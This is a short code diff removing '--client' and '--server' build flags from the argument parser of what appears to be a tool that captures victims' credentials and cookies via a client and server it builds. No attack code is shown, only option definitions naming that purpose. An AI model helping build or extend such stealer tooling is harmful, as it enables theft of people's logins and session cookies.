@@ -148,10 +148,6 @@ def parse_arguments():
                         action="store_true", default=False, help="Use to only capture credentials and not cookies. Default is both")
     parser.add_argument('--nologin', dest="login_bool",
                         action="store_true", default=False, help="Use to only capture cookies and not credentials. Default is both")
-    parser.add_argument('--client', dest="client",
-                        action="store_true", default=False, help="Use to only build the client. Default is both client and server")
-    parser.add_argument('--server', dest="server",
-                        action="store_true", default=False, help="Use to only build the server. Default is both client and server")
     parser.add_argument('--pyserver', dest="pyserver",
                         action="store_true", default=False, help="Creates a python version of the server instead of an executable. Pair it with --nobuild-server to only have it as python")
     parser.add_argument('--pyclient', dest="pyclient",
